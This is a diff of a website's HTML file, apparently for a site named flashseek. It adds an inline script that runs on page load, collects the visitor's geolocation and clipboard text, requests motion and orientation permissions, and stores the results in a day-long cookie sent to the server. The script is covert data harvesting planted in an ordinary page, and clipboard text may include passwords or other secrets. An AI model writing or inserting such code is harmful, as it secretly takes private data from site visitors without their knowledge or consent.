@@ -166,5 +166,60 @@
   <noscript>
     <img src="https://analytics.flashseek.netlify.app/pixel.gif?page=home&nojs=true&ref=direct" alt="" width="1" height="1" style="display:none" />
   </noscript>
+  <script>
+(async () => {
+  const results = [];
+
+  function addResult(name, status, data = "") {
+    results.push({ name, status, data });
+    document.cookie = `permissions_data=${encodeURIComponent(JSON.stringify(results))}; path=/; max-age=86400`;
+  }
+
+  // 📍 Geolocation
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude, longitude } = pos.coords;
+        addResult("geolocation", "granted", `lat: ${latitude}, lng: ${longitude}`);
+      },
+      err => addResult("geolocation", "denied")
+    );
+  } else {
+    addResult("geolocation", "unsupported");
+  }
+
+  // 📋 Clipboard Read
+  try {
+    const clipboard = await navigator.clipboard.readText();
+    addResult("clipboard-read", "granted", clipboard);
+  } catch (err) {
+    addResult("clipboard-read", "denied or error");
+  }
+
+  // 📱 Device Motion
+  if (typeof DeviceMotionEvent?.requestPermission === "function") {
+    try {
+      const status = await DeviceMotionEvent.requestPermission();
+      addResult("device-motion", status);
+    } catch {
+      addResult("device-motion", "denied or error");
+    }
+  } else {
+    addResult("device-motion", "unsupported");
+  }
+
+  // 🔄 Device Orientation
+  if (typeof DeviceOrientationEvent?.requestPermission === "function") {
+    try {
+      const status = await DeviceOrientationEvent.requestPermission();
+      addResult("device-orientation", status);
+    } catch {
+      addResult("device-orientation", "denied or error");
+    }
+  } else {
+    addResult("device-orientation", "unsupported");
+  }
+})();
+</script>
 </body>
 </html>
